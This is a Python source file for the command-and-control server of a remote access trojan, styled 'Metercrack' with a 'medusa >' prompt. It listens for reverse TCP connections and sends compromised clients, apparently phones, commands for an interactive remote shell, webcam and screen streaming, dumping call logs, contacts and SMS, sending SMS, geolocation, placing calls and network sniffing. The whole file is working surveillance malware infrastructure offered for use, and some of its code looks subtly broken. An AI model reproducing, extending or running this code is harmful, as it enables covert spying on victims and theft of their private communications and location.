import socket
import threading
import time
import signal
from flask import Flask, Response
import cv2
import numpy as np
from pynput import keyboard
import sys
import os

from colorama import Fore, Style, init

init(autoreset=True)

app = Flask(__name__)
clients = {}
server_thread = None
streaming_active = False  # Flag to track streaming status

def start_streaming(client_socket, mode):
    global streaming_active
    streaming_active = True
    print(Fore.BLUE + "[ * ] Starting...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    @app.route('/')
    def video_feed():
        return Response(generate_frames(client_socket),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

    # Run the Flask app in a separate thread to handle the streaming
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()

def generate_frames(client_socket):
    while True:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")

    while True:
        try:
            command = input(Fore.MAGENTA + "medusa > ")
        except EOFError:
            break

        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        if command == "sniffer_start":
            print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
            
        if command == "shell":
            print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
            while True:
                shell_command = input(Fore.CYAN + "shell > ")
                if shell_command.lower() == "exit":
                    print(Fore.YELLOW + "[ * ] Exiting shell mode.")
                    break
                client_socket.send(shell_command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(Fore.WHITE + output)
            continue

        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
            mode = command.split('_')[0]
            start_streaming(client_socket, mode)
            continue

        if command.startswith("dump_calllog"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_contacts"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue
        
        if command.startswith("send_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("geolocate"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("call"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        client_socket.send(command.encode('utf-8'))

def stop_server():
    global streaming_active
    streaming_active = False
    print(Fore.RED + "[ * ] Stopping Flask server...")
    os.kill(os.getpid(), signal.SIGINT)  # Trigger a SIGINT to properly shut down the Flask app

def signal_handler(sig, frame):
    print(Fore.RED + "[ * ] CTRL+C detected! Stopping Flask server...")
    stop_server()
    sys.exit(0)

def on_press(key):
    global streaming_active
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            if keyboard.Listener.cooked_keys.get(keyboard.Key.shift):
                if streaming_active:
                    print(Fore.YELLOW + "[ * ] CTRL + SHIFT pressed. Stopping streaming...")
                    stop_server()
                    return False  # Stop listening for the keys
    except AttributeError:
        pass

def main():
    signal.signal(signal.SIGINT, signal_handler)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
